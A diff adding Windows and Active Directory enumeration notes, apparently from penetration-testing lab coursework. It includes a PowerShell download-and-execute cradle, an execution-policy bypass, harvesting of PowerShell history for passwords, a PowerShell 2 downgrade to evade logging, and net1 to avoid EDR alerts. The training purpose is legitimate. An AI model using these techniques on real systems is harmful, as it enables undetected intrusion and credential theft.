@@ -572,3 +572,171 @@ _Run Snaffler and hunt for a readable web config file. What is the name of the u
 _What is the password for the database user?_
 
 <figure><img src="../../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+## Living Off the Land
+
+To enumerate the host and the network we're on, here are some basic commands:
+
+| `hostname`                                              | Prints the PC's Name                                                                       |
+| ------------------------------------------------------- | ------------------------------------------------------------------------------------------ |
+| `[System.Environment]::OSVersion.Version`               | Prints out the OS version and revision level                                               |
+| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Prints the patches and hotfixes applied to the host                                        |
+| `ipconfig /all`                                         | Prints out network adapter state and configurations                                        |
+| `set`                                                   | Displays a list of environment variables for the current session (ran from CMD-prompt)     |
+| `echo %USERDOMAIN%`                                     | Displays the domain name to which the host belongs (ran from CMD-prompt)                   |
+| `echo %logonserver%`                                    | Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt) |
+
+The `systeminfo` command is a nice one to run if we want to know a lot about our host without triggering to much logs
+
+Here are some quick powershell cmdlets that we can use for our recon:
+
+| `Get-Module`                                                                                                               | Lists available modules loaded for use.                                                                                                                                                                                                       |
+| -------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| `Get-ExecutionPolicy -List`                                                                                                | Will print the [execution policy](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about\_execution\_policies?view=powershell-7.2) settings for each scope on a host.                                       |
+| `Set-ExecutionPolicy Bypass -Scope Process`                                                                                | This will change the policy for our current process using the `-Scope` parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host. |
+| `Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt`          | With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords.                       |
+| `Get-ChildItem Env: \| ft Key,Value`                                                                                       | Return environment values such as key paths, users, computer information, etc.                                                                                                                                                                |
+| `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"` | This is a quick and easy way to download a file from the web using PowerShell and call it from memory.                                                                                                                                        |
+
+### **Downgrade Powershell**
+
+It's very good to know that several versions of PowerShell often exist on a host, if we are able to downgrade , our actions from the shell will not be logged in Event Viewer. This is a great way for us to remain under the defenders' radar while still utilizing resources built into the hosts to our advantage.
+
+Let's try this out:
+
+```powershell-session
+PS C:\htb> Get-host
+
+Name             : ConsoleHost
+Version          : 5.1.19041.1320
+[...]
+
+PS C:\htb> powershell.exe -version 2
+Windows PowerShell
+Copyright (C) 2009 Microsoft Corporation. All rights reserved.
+
+PS C:\htb> Get-host
+Name             : ConsoleHost
+Version          : 2.0
+[...]
+```
+
+### **Firewall Checks**
+
+```powershell-session
+PS C:\htb> netsh advfirewall show allprofiles
+```
+
+**Windows Defender Check (from CMD.exe)**
+
+```cmd-session
+C:\htb> sc query windefend
+```
+
+**Using qwinsta to check if you're alone on the host:**
+
+```powershell-session
+PS C:\htb> qwinsta
+
+ SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
+ services                                    0  Disc
+>console           forend                    1  Active
+ rdp-tcp                                 65536  Listen
+```
+
+### Network enumeration:
+
+| `arp -a`                       | Lists all known hosts stored in the arp table.                                                                   |
+| ------------------------------ | ---------------------------------------------------------------------------------------------------------------- |
+| `ipconfig /all`                | Prints out adapter settings for the host. We can figure out the network segment from here.                       |
+| `route print`                  | Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host. |
+| `netsh advfirewall show state` | Displays the status of the host's firewall. We can determine if it is active and filtering traffic.              |
+
+### WMI
+
+[Windows Management Instrumentation (WMI)](https://docs.microsoft.com/en-us/windows/win32/wmisdk/about-wmi) is a scripting engine that is widely used within Windows enterprise environments to retrieve information and run administrative tasks on local and remote hosts. Here are some useful commands you should know:
+
+| `wmic qfe get Caption,Description,HotFixID,InstalledOn`                              | Prints the patch level and description of the Hotfixes applied                                         |
+| ------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------ |
+| `wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List` | Displays basic host information to include any attributes within the list                              |
+| `wmic process list /format:list`                                                     | A listing of all processes on host                                                                     |
+| `wmic ntdomain list /format:list`                                                    | Displays information about the Domain and Domain Controllers                                           |
+| `wmic useraccount list /format:list`                                                 | Displays information about all local accounts and any domain accounts that have logged into the device |
+| `wmic group list /format:list`                                                       | Information about all local groups                                                                     |
+| `wmic sysaccount list /format:list`                                                  | Dumps information about any system accounts that are being used as service accounts.                   |
+
+### Net Commands
+
+[Net](https://docs.microsoft.com/en-us/windows/win32/winsock/net-exe-2) commands can be beneficial to us when attempting to enumerate information from the domain.
+
+It's good to know that `net.exe` commands are typically monitored by EDR solutions and can quickly give up our location. But if we don't care about being evasive, here are some commands:
+
+| `net accounts`                                  | Information about password requirements                                                                                      |
+| ----------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------- |
+| `net accounts /domain`                          | Password and lockout policy                                                                                                  |
+| `net group /domain`                             | Information about domain groups                                                                                              |
+| `net group "Domain Admins" /domain`             | List users with domain admin privileges                                                                                      |
+| `net group "domain computers" /domain`          | List of PCs connected to the domain                                                                                          |
+| `net group "Domain Controllers" /domain`        | List PC accounts of domains controllers                                                                                      |
+| `net group <domain_group_name> /domain`         | User that belongs to the group                                                                                               |
+| `net groups /domain`                            | List of domain groups                                                                                                        |
+| `net localgroup`                                | All available groups                                                                                                         |
+| `net localgroup administrators /domain`         | List users that belong to the administrators group inside the domain (the group `Domain Admins` is included here by default) |
+| `net localgroup Administrators`                 | Information about a group (admins)                                                                                           |
+| `net localgroup administrators [username] /add` | Add user to administrators                                                                                                   |
+| `net share`                                     | Check current shares                                                                                                         |
+| `net user <ACCOUNT_NAME> /domain`               | Get information about a user within the domain                                                                               |
+| `net user /domain`                              | List all users of the domain                                                                                                 |
+| `net user %username%`                           | Information about the current user                                                                                           |
+| `net use x: \computer\share`                    | Mount the share locally                                                                                                      |
+| `net view`                                      | Get a list of computers                                                                                                      |
+| `net view /all /domain[:domainname]`            | Shares on the domains                                                                                                        |
+| `net view \computer /ALL`                       | List shares of a computer                                                                                                    |
+| `net view /domain`                              | List of PCs of the domain                                                                                                    |
+
+If there is a network defender up, you can trick & bypass it but using `net1` command rather than `net`. It will do the same thing and will not trigger a net string alert
+
+### Dsquery
+
+[Dsquery](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732952\(v=ws.11\)) is a helpful command-line tool that can be utilized to find Active Directory objects. By default, the dsquery dll can be found at `C:\Windows\System32\dsquery.dll`.
+
+**User search**
+
+```powershell-session
+PS C:\htb> dsquery user
+```
+
+**Computer search**
+
+```powershell-session
+PS C:\htb> dsquery computer
+```
+
+**Wildcard Search**
+
+to view all objects in an OU, for example.
+
+```powershell-session
+PS C:\htb> dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
+```
+
+**Users With Specific Attributes Set (PASSWD\_NOTREQD)**
+
+```powershell-session
+PS C:\htb> dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
+
+  distinguishedName                                                                              userAccountControl
+  CN=Guest,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                                    66082
+  CN=Marion Lowe,OU=HelpDesk,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL      66080
+  CN=Yolanda Groce,OU=HelpDesk,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL    66080
+  CN=Eileen Hamilton,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL    66080
+  CN=Jessica Ramsey,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                           546
+  CN=NAGIOSAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL                           544
+  CN=LOGISTICS$,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                               2080
+  CN=FREIGHTLOGISTIC$,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                         2080
+
+```
+
+It's good to know the **UAC Values**
+
+<figure><img src="../../../../.gitbook/assets/image (1053).png" alt=""><figcaption></figcaption></figure>
